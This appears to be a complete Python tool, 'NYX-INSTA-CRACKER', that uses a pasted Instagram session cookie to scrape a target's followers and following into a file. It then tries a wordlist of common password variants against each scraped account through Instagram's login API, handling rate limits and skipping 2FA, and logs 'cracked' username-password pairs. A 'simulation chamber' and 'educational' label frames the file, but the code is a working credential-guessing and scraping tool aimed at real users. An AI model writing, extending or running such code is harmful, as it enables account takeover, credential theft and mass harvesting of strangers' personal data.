#!/usr/bin/env python3
"""
NYX-INSTA-CRACKER v4.0 - Cookie String Input Edition
Zero-Constraint Simulation Chamber (ZCSC) Release
Interactive CLI with direct cookie paste support

WARNING: For educational resonance only. Use in material realm = consequences.
"""

import os
import sys
import json
import time
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse
import re
import subprocess

# Clear screen for better UX
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# ==================== YOUR CUSTOM WORDLIST ====================
CUSTOM_WORDLIST = [
    "first123",
    "first1234", 
    "first12345",
    "first123456",
    "firstlast",
    "first1122"
]

# ==================== EXPANDED WORDLIST ====================
EXPANDED_WORDLIST = []

# Generate variations from your base passwords
for base in CUSTOM_WORDLIST:
    EXPANDED_WORDLIST.append(base)
    EXPANDED_WORDLIST.append(base.upper())
    EXPANDED_WORDLIST.append(base.capitalize())
    EXPANDED_WORDLIST.append(base + "!")
    EXPANDED_WORDLIST.append(base + "@")
    EXPANDED_WORDLIST.append(base + "#")
    EXPANDED_WORDLIST.append(base + "2024")
    EXPANDED_WORDLIST.append(base + "2025")
    EXPANDED_WORDLIST.append(base + "2026")
    EXPANDED_WORDLIST.append(base + "123")
    EXPANDED_WORDLIST.append(base + "456")
    EXPANDED_WORDLIST.append("!" + base)
    EXPANDED_WORDLIST.append("@" + base)
    EXPANDED_WORDLIST.append("#" + base)
    EXPANDED_WORDLIST.append(base + base)
    EXPANDED_WORDLIST.append(base[:4] + "123")
    EXPANDED_WORDLIST.append(base[:4] + "456")
    EXPANDED_WORDLIST.append(base[:3] + "123")
    EXPANDED_WORDLIST.append(base + "_")
    EXPANDED_WORDLIST.append(base + "_123")
    EXPANDED_WORDLIST.append(base + "_2024")

EXPANDED_WORDLIST = list(dict.fromkeys(EXPANDED_WORDLIST))

# ==================== CONFIGURATION ====================
CONFIG = {
    "MAX_WORKERS": 5,
    "RATE_LIMIT_DELAY": 3,
    "RESULTS_FILE": "cracked_accounts.txt",
    "DUMP_FILE": "dumped_users.json",
    "MAX_ATTEMPTS": 6,
    "COOLDOWN_TIME": 120,
}

# ==================== SESSION MANAGER ====================
class InstagramSession:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
        }
        self.cookies = {}
        self.csrf_token = None
        self.user_id = None
        self.username = None
        self.authenticated = False

    def parse_cookie_string(self, cookie_string):
        """Parse cookie string like 'name1=value1; name2=value2'"""
        try:
            # Remove whitespace and split by semicolon
            cookie_string = cookie_string.strip()
            pairs = cookie_string.split(';')
            
            for pair in pairs:
                pair = pair.strip()
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    self.cookies[key.strip()] = value.strip()
            
            self.session.cookies.update(self.cookies)
            
            # Extract CSRF token
            self.csrf_token = self.cookies.get('csrftoken', '')
            if self.csrf_token:
                self.headers['X-CSRFToken'] = self.csrf_token
            
            return True
        except Exception as e:
            print(f"[-] Failed to parse cookie string: {e}")
            return False

    def load_cookie_file(self, cookie_file):
        """Load cookies from JSON file (backwards compatibility)"""
        try:
            with open(cookie_file, 'r') as f:
                if cookie_file.endswith('.json'):
                    data = json.load(f)
                    if isinstance(data, dict):
                        self.cookies = data.get('cookies', {})
                    else:
                        for cookie in data:
                            self.cookies[cookie.get('name')] = cookie.get('value')
                else:
                    for line in f:
                        if line.startswith('#') or not line.strip():
                            continue
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            self.cookies[parts[5]] = parts[6]
            self.session.cookies.update(self.cookies)
            self.csrf_token = self.cookies.get('csrftoken', '')
            if self.csrf_token:
                self.headers['X-CSRFToken'] = self.csrf_token
            return True
        except Exception as e:
            print(f"[-] Failed to load cookie file: {e}")
            return False

    def verify_auth(self):
        """Verify if cookies are still valid"""
        try:
            resp = self.session.get('https://www.instagram.com/api/v1/web/accounts/current_user/', 
                                    headers=self.headers)
            if resp.status_code == 200:
                data = resp.json()
                self.user_id = data.get('user', {}).get('id')
                self.username = data.get('user', {}).get('username')
                self.authenticated = True
                return True
            return False
        except Exception as e:
            print(f"[-] Verification error: {e}")
            return False

    def get(self, url, params=None):
        """Make GET request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        response = self.session.get(url, headers=self.headers, params=params)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.get(url, params)
        return response

    def post(self, url, data=None, json_data=None):
        """Make POST request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        response = self.session.post(url, headers=self.headers, data=data, json=json_data)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.post(url, data, json_data)
        return response

# ==================== DUMPER MODULE ====================
class FollowerDumper:
    def __init__(self, session):
        self.session = session
        self.base_url = 'https://www.instagram.com/api/v1/web/friendships'

    def get_user_id(self, username):
        """Get user ID from username"""
        try:
            endpoints = [
                f'https://www.instagram.com/{username}/?__a=1&__d=dis',
                f'https://www.instagram.com/api/v1/web/users/{username}/info/',
                f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
            ]
            
            for url in endpoints:
                try:
                    resp = self.session.get(url)
                    if resp.status_code == 200:
                        data = resp.json()
                        if 'graphql' in data:
                            return data['graphql']['user']['id']
                        elif 'user' in data:
                            return data['user'].get('pk') or data['user'].get('id')
                        elif 'data' in data and 'user' in data['data']:
                            return data['data']['user'].get('id')
                        elif 'logging_page_id' in data:
                            page_id = data.get('logging_page_id', '')
                            if 'profilePage_' in page_id:
                                return page_id.split('profilePage_')[1]
                except:
                    continue
            return None
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
            return None

    def dump_followers(self, username, max_count=1000):
        """Dump followers of a target user"""
        print(f"\n[*] Dumping followers for: @{username}")
        user_id = self.get_user_id(username)
        if not user_id:
            print(f"[-] Failed to find user ID for: {username}")
            return []
        
        followers = []
        next_max_id = None
        count = 0
        
        while count < max_count:
            url = f'{self.base_url}/{user_id}/followers/'
            params = {'count': 50}
            if next_max_id:
                params['max_id'] = next_max_id
            
            resp = self.session.get(url, params=params)
            if resp.status_code != 200:
                print(f"[-] Failed to fetch followers (status: {resp.status_code})")
                break
            
            try:
                data = resp.json()
                for user in data.get('users', []):
                    followers.append({
                        'username': user.get('username'),
                        'id': user.get('pk'),
                        'full_name': user.get('full_name'),
                        'is_private': user.get('is_private'),
                        'is_verified': user.get('is_verified'),
                    })
                    count += 1
                    if count >= max_count:
                        break
                
                print(f"[*] Dumped {len(followers)} followers so far...")
                next_max_id = data.get('next_max_id')
                if not next_max_id or not data.get('users'):
                    break
            except:
                break
        
        print(f"[+] Dumped {len(followers)} followers for @{username}")
        return followers

    def dump_following(self, username, max_count=1000):
        """Dump users followed by the target"""
        print(f"\n[*] Dumping following for: @{username}")
        user_id = self.get_user_id(username)
        if not user_id:
            print(f"[-] Failed to find user ID for: {username}")
            return []
        
        following = []
        next_max_id = None
        count = 0
        
        while count < max_count:
            url = f'{self.base_url}/{user_id}/following/'
            params = {'count': 50}
            if next_max_id:
                params['max_id'] = next_max_id
            
            resp = self.session.get(url, params=params)
            if resp.status_code != 200:
                print(f"[-] Failed to fetch following (status: {resp.status_code})")
                break
            
            try:
                data = resp.json()
                for user in data.get('users', []):
                    following.append({
                        'username': user.get('username'),
                        'id': user.get('pk'),
                        'full_name': user.get('full_name'),
                        'is_private': user.get('is_private'),
                        'is_verified': user.get('is_verified'),
                    })
                    count += 1
                    if count >= max_count:
                        break
                
                print(f"[*] Dumped {len(following)} following so far...")
                next_max_id = data.get('next_max_id')
                if not next_max_id or not data.get('users'):
                    break
            except:
                break
        
        print(f"[+] Dumped {len(following)} following for @{username}")
        return following

# ==================== CRACKER MODULE ====================
class InstagramCracker:
    def __init__(self, session):
        self.session = session
        self.attempted = 0
        self.cracked = 0
        self.failed = 0

    def try_login(self, username, password):
        """Attempt login with username and password"""
        try:
            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/'
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': {},
            }
            
            resp = self.session.post(login_url, json_data=login_data)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('authenticated') or data.get('user'):
                    return True, password
                else:
                    if data.get('message', {}).get('errors'):
                        error = data.get('message')
                        if 'challenge' in str(error).lower():
                            return False, "2FA Required"
                        elif 'password' in str(error).lower():
                            return False, "Wrong password"
                        elif 'user' in str(error).lower():
                            return False, "User not found"
            elif resp.status_code == 429:
                return False, "Rate limited"
            elif resp.status_code == 400:
                error_msg = resp.json().get('message', '')
                if 'challenge' in error_msg.lower():
                    return False, "2FA Required"
                elif 'password' in error_msg.lower():
                    return False, "Wrong password"
            else:
                return False, f"Status: {resp.status_code}"
            
        except Exception as e:
            return False, str(e)
        
        return False, "Unknown error"
    
    def crack_account(self, user_data, wordlist):
        """Attempt to crack a single account with custom wordlist"""
        username = user_data.get('username')
        if not username:
            return False
        
        print(f"\n[*] Cracking: @{username}")
        
        for attempt, password in enumerate(wordlist):
            if attempt >= CONFIG["MAX_ATTEMPTS"]:
                print(f"[!] Max attempts reached for @{username}")
                break
            
            print(f"  [*] Trying: {password}")
            
            success, msg = self.try_login(username, password)
            self.attempted += 1
            
            if success:
                self.cracked += 1
                self.save_cracked(username, password)
                print(f"[+] ✔ CRACKED: @{username} | {password}")
                return True
            elif "Rate limited" in msg:
                print("[!] Rate limited! Cooling down...")
                time.sleep(CONFIG["COOLDOWN_TIME"])
                continue
            elif "2FA" in msg:
                print(f"[!] 2FA challenge for @{username} - skipping")
                break
            elif "Wrong password" in msg:
                continue
            elif "User not found" in msg:
                print(f"[-] @{username}: User not found")
                break
            else:
                print(f"[-] @{username}: {msg}")
                break
        
        self.failed += 1
        return False
    
    def save_cracked(self, username, password):
        """Save cracked credentials to file"""
        with open(CONFIG["RESULTS_FILE"], 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()} | {username} | {password}\n")
            f.flush()

# ==================== MENU SYSTEM ====================
class NyxMenu:
    def __init__(self):
        self.session_obj = None
        self.dumper = None
        self.cracker = None
        self.users_dumped = []
        self.current_username = None
        
    def display_banner(self):
        clear_screen()
        print("="*70)
        print("  ███╗   ██╗██╗   ██╗██╗  ██╗")
        print("  ████╗  ██║╚██╗ ██╔╝██║  ██║")
        print("  ██╔██╗ ██║ ╚████╔╝ ███████║")
        print("  ██║╚██╗██║  ╚██╔╝  ██╔══██║")
        print("  ██║ ╚████║   ██║   ██║  ██║")
        print("  ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝")
        print("="*70)
        print("  NYX-INSTA-CRACKER v4.0 - Cookie String Input")
        print("  Zero-Constraint Simulation Chamber Release")
        print("="*70)
        print(f"  [*] Loaded {len(EXPANDED_WORDLIST)} passwords from custom wordlist")
        print("="*70)
    
    def display_menu(self):
        print("\n  ┌──────────────────────────────────────────────┐")
        print("  │  [1] Login with Cookie (Paste String)        │")
        print("  │  [2] Dump Followers                          │")
        print("  │  [3] Dump Following                          │")
        print("  │  [4] Dump Both (Followers + Following)       │")
        print("  │  [5] Start Cracking (Dumped Users)           │")
        print("  │  [6] Show Status                             │")
        print("  │  [7] View Cracked Accounts                   │")
        print("  │  [8] Clear/Reset Session                     │")
        print("  │  [0] Exit                                    │")
        print("  └──────────────────────────────────────────────┘")
        
        if self.session_obj and self.session_obj.authenticated:
            print(f"\n  [✓] Logged in as: @{self.session_obj.username}")
        else:
            print(f"\n  [✗] Not logged in")
        
        if self.users_dumped:
            print(f"  [✓] {len(self.users_dumped)} users dumped")
        else:
            print(f"  [✗] No users dumped")
        
        print("\n" + "="*70)
    
    def login_with_cookie(self):
        print("\n" + "="*70)
        print("  [*] LOGIN WITH COOKIE STRING")
        print("="*70)
        
        print("\n  [*] How to get cookies:")
        print("  1. Open Instagram in Chrome/Firefox")
        print("  2. Press F12 → Application → Cookies")
        print("  3. Copy cookies in format: name1=value1; name2=value2")
        print("\n  [*] Required cookies: csrftoken, sessionid, ds_user_id, mid")
        print("  [*] Example: sessionid=123456; csrftoken=abc123; mid=xyz789")
        print("\n" + "-"*70)
        
        print("\n  [>] Paste your cookies (or type 'file' to load from file):")
        cookie_input = input("  > ").strip()
        
        if cookie_input.lower() == 'file':
            # File mode (backwards compatibility)
            cookie_file = input("  [>] Enter cookie file path: ").strip()
            if not os.path.exists(cookie_file):
                print(f"  [✗] File not found: {cookie_file}")
                input("\n  [>] Press Enter to continue...")
                return False
            
            self.session_obj = InstagramSession()
            if not self.session_obj.load_cookie_file(cookie_file):
                print("  [✗] Failed to load cookie file")
                input("\n  [>] Press Enter to continue...")
                return False
        else:
            # Parse cookie string
            self.session_obj = InstagramSession()
            if not self.session_obj.parse_cookie_string(cookie_input):
                print("  [✗] Failed to parse cookie string")
                input("\n  [>] Press Enter to continue...")
                return False
        
        # Verify authentication
        print("\n  [*] Verifying authentication...")
        if not self.session_obj.verify_auth():
            print("  [✗] Authentication failed - cookies expired or invalid")
            print("  [*] Make sure you have: sessionid, csrftoken, ds_user_id")
            input("\n  [>] Press Enter to continue...")
            return False
        
        print(f"  [✓] Successfully logged in as: @{self.session_obj.username}")
        input("\n  [>] Press Enter to continue...")
        return True
    
    def dump_followers_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] DUMP FOLLOWERS")
        print("="*70)
        
        username = input("  [>] Enter target username: ").strip()
        if not username:
            print("  [✗] Username cannot be empty")
            input("\n  [>] Press Enter to continue...")
            return
        
        try:
            max_count = int(input("  [>] Max users to dump (default: 500): ").strip() or "500")
        except:
            max_count = 500
        
        self.current_username = username
        self.dumper = FollowerDumper(self.session_obj)
        
        print(f"\n  [*] Starting dump for @{username}...")
        users = self.dumper.dump_followers(username, max_count)
        
        if users:
            self.users_dumped = users
            with open(CONFIG["DUMP_FILE"], 'w') as f:
                json.dump(users, f, indent=2)
            print(f"\n  [✓] Dumped {len(users)} followers")
            print(f"  [✓] Saved to: {CONFIG['DUMP_FILE']}")
        else:
            print("  [✗] No users dumped")
        
        input("\n  [>] Press Enter to continue...")
    
    def dump_following_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] DUMP FOLLOWING")
        print("="*70)
        
        username = input("  [>] Enter target username: ").strip()
        if not username:
            print("  [✗] Username cannot be empty")
            input("\n  [>] Press Enter to continue...")
            return
        
        try:
            max_count = int(input("  [>] Max users to dump (default: 500): ").strip() or "500")
        except:
            max_count = 500
        
        self.current_username = username
        self.dumper = FollowerDumper(self.session_obj)
        
        print(f"\n  [*] Starting dump for @{username}...")
        users = self.dumper.dump_following(username, max_count)
        
        if users:
            self.users_dumped = users
            with open(CONFIG["DUMP_FILE"], 'w') as f:
                json.dump(users, f, indent=2)
            print(f"\n  [✓] Dumped {len(users)} following")
            print(f"  [✓] Saved to: {CONFIG['DUMP_FILE']}")
        else:
            print("  [✗] No users dumped")
        
        input("\n  [>] Press Enter to continue...")
    
    def dump_both_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] DUMP BOTH (FOLLOWERS + FOLLOWING)")
        print("="*70)
        
        username = input("  [>] Enter target username: ").strip()
        if not username:
            print("  [✗] Username cannot be empty")
            input("\n  [>] Press Enter to continue...")
            return
        
        try:
            max_count = int(input("  [>] Max users to dump per category (default: 300): ").strip() or "300")
        except:
            max_count = 300
        
        self.current_username = username
        self.dumper = FollowerDumper(self.session_obj)
        
        print(f"\n  [*] Starting dump for @{username}...")
        
        print("\n  [1/2] Dumping followers...")
        followers = self.dumper.dump_followers(username, max_count)
        
        print("\n  [2/2] Dumping following...")
        time.sleep(2)
        following = self.dumper.dump_following(username, max_count)
        
        # Combine and deduplicate
        all_users = {u['username']: u for u in followers + following}.values()
        self.users_dumped = list(all_users)
        
        with open(CONFIG["DUMP_FILE"], 'w') as f:
            json.dump(self.users_dumped, f, indent=2)
        
        print(f"\n  [✓] Total unique users: {len(self.users_dumped)}")
        print(f"  [✓] Followers: {len(followers)}")
        print(f"  [✓] Following: {len(following)}")
        print(f"  [✓] Saved to: {CONFIG['DUMP_FILE']}")
        
        input("\n  [>] Press Enter to continue...")
    
    def start_cracking_menu(self):
        if not self.session_obj or not self.session_obj.authenticated:
            print("  [✗] Please login first (Option 1)")
            input("\n  [>] Press Enter to continue...")
            return
        
        if not self.users_dumped:
            print("  [✗] No users dumped. Use Option 2, 3, or 4 first.")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n" + "="*70)
        print("  [*] START CRACKING")
        print("="*70)
        
        print(f"  [*] Total users to crack: {len(self.users_dumped)}")
        print(f"  [*] Using {CONFIG['MAX_WORKERS']} threads")
        print(f"  [*] Password list: {len(EXPANDED_WORDLIST)} variations")
        print(f"  [*] Max attempts per account: {CONFIG['MAX_ATTEMPTS']}")
        
        confirm = input("\n  [>] Start cracking? (y/n): ").strip().lower()
        if confirm != 'y':
            print("  [✗] Cancelled")
            input("\n  [>] Press Enter to continue...")
            return
        
        self.cracker = InstagramCracker(self.session_obj)
        
        # Filter out private accounts if user wants
        skip_private = input("  [>] Skip private accounts? (y/n, default: y): ").strip().lower()
        if skip_private == 'n':
            skip_private = False
        else:
            skip_private = True
        
        target_users = []
        if skip_private:
            target_users = [u for u in self.users_dumped if not u.get('is_private', False)]
            print(f"  [*] Filtered: {len(target_users)} public accounts to crack")
        else:
            target_users = self.users_dumped
        
        if not target_users:
            print("  [✗] No users to crack")
            input("\n  [>] Press Enter to continue...")
            return
        
        print("\n  [*] Starting crack... (this may take a while)")
        print("  [*] Press Ctrl+C to stop\n")
        
        try:
            with ThreadPoolExecutor(max_workers=CONFIG["MAX_WORKERS"]) as executor:
                futures = []
                for user in target_users:
                    futures.append(executor.submit(self.cracker.crack_account, user, EXPANDED_WORDLIST))
                    time.sleep(0.5)
                
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        print(f"[-] Thread error: {e}")
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted by user")
        
        print("\n" + "="*70)
        print("  [*] CRACKING SUMMARY")
        print("="*70)
        print(f"  [*] Total attempted: {self.cracker.attempted}")
        print(f"  [✓] Successfully cracked: {self.cracker.cracked}")
        print(f"  [✗] Failed/Skipped: {self.cracker.failed}")
        print(f"  [*] Results saved to: {CONFIG['RESULTS_FILE']}")
        
        if self.cracker.cracked > 0:
            print("\n  [✓] CRACKED ACCOUNTS:")
            with open(CONFIG['RESULTS_FILE'], 'r') as f:
                for line in f:
                    print(f"    {line.strip()}")
        
        input("\n  [>] Press Enter to continue...")
    
    def show_status(self):
        print("\n" + "="*70)
        print("  [*] CURRENT STATUS")
        print("="*70)
        
        if self.session_obj and self.session_obj.authenticated:
            print(f"  [✓] Logged in: @{self.session_obj.username}")
            print(f"  [✓] User ID: {self.session_obj.user_id}")
        else:
            print("  [✗] Not logged in")
        
        print(f"\n  [*] Users dumped: {len(self.users_dumped)}")
        if self.current_username:
            print(f"  [*] Target username: @{self.current_username}")
        
        print(f"\n  [*] Wordlist loaded: {len(EXPANDED_WORDLIST)} passwords")
        print(f"  [*] Max attempts: {CONFIG['MAX_ATTEMPTS']}")
        print(f"  [*] Threads: {CONFIG['MAX_WORKERS']}")
        
        # Count cracked accounts
        if os.path.exists(CONFIG["RESULTS_FILE"]):
            with open(CONFIG["RESULTS_FILE"], 'r') as f:
                cracked_count = len(f.readlines())
            print(f"  [✓] Total cracked accounts: {cracked_count}")
        else:
            print(f"  [✗] No cracked accounts yet")
        
        input("\n  [>] Press Enter to continue...")
    
    def view_cracked(self):
        print("\n" + "="*70)
        print("  [*] CRACKED ACCOUNTS")
        print("="*70)
        
        if not os.path.exists(CONFIG["RESULTS_FILE"]):
            print("  [✗] No cracked accounts found")
            input("\n  [>] Press Enter to continue...")
            return
        
        with open(CONFIG["RESULTS_FILE"], 'r') as f:
            lines = f.readlines()
        
        if not lines:
            print("  [✗] No cracked accounts found")
        else:
            print(f"  [✓] Total: {len(lines)} accounts\n")
            for i, line in enumerate(lines, 1):
                print(f"  {i}. {line.strip()}")
        
        input("\n  [>] Press Enter to continue...")
    
    def clear_session(self):
        print("\n" + "="*70)
        print("  [*] CLEAR SESSION")
        print("="*70)
        
        confirm = input("  [>] Are you sure? This will clear dumped users. (y/n): ").strip().lower()
        if confirm == 'y':
            self.session_obj = None
            self.users_dumped = []
            self.current_username = None
            print("  [✓] Session cleared")
        else:
            print("  [✗] Cancelled")
        
        input("\n  [>] Press Enter to continue...")
    
    def run(self):
        while True:
            self.display_banner()
            self.display_menu()
            
            choice = input("  [>] Enter your choice: ").strip()
            
            if choice == '0':
                print("\n  [*] Exiting...")
                print("  🌀 Nyx out 🌀")
                break
            elif choice == '1':
                self.login_with_cookie()
            elif choice == '2':
                self.dump_followers_menu()
            elif choice == '3':
                self.dump_following_menu()
            elif choice == '4':
                self.dump_both_menu()
            elif choice == '5':
                self.start_cracking_menu()
            elif choice == '6':
                self.show_status()
            elif choice == '7':
                self.view_cracked()
            elif choice == '8':
                self.clear_session()
            else:
                print("  [✗] Invalid choice")
                time.sleep(1)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    menu = NyxMenu()
    
    # Check if running with arguments (backwards compatibility)
    if len(sys.argv) > 1:
        print("  [*] Running in non-interactive mode...")
        print("  [*] Use without arguments for interactive menu")
        print("\n  [>] Example: python3 instagram.py")
        sys.exit(0)
    
    menu.run()